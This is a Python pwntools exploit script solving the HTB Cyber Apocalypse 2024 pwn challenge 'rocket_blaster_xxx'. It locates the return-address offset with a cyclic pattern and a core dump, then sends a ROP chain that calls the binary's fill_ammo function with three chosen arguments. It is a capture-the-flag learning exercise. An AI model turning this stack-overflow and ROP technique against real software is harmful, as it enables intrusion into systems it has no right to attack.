#!/usr/bin/python3

## HTB - Cyber Apocalypse 2024
## pwn: rocket_blaster_xxx

import pwn

pwn.context.log_level = 'debug'
executable = "./rocket_blaster_xxx"

# Finding Offset
elf = pwn.ELF(executable)
io = elf.process()
io.sendline(pwn.cyclic(100, n=8))
io.wait()
core = io.corefile
rip_offset = pwn.cyclic_find(core.read(core.rsp, 8), n=8)
print('OFFSET:', rip_offset)

# Exploiting
elf = pwn.ELF(executable)
rop = pwn.ROP(elf)
io = elf.process()
#io = pwn.remote("10.10.10.10", 1337)

# Finding Gadgets
pop_ret = rop.ret.address # Two bytes aligment required (movaps)
#pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
pop_rdi = rop.rdi.address
pop_rsi = rop.rsi.address
pop_rdx = rop.rdx.address
new_rip = elf.symbols["fill_ammo"]

payload = b"".join([
    b"A" * rip_offset,
    pwn.p64(pop_ret),
    pwn.p64(pop_rdi),
    pwn.p64(0xdeadbeef), # Argument 1
    pwn.p64(pop_rsi),
    pwn.p64(0xdeadbabe), # Argument 2
    pwn.p64(pop_rdx),
    pwn.p64(0xdead1337), # Argument 3
    pwn.p64(new_rip),
])

io.sendlineafter(b">> ", payload)
print(io.recvall().decode())
print('PAYLOAD:', payload)

io.close()
#io.interactive()
exit()

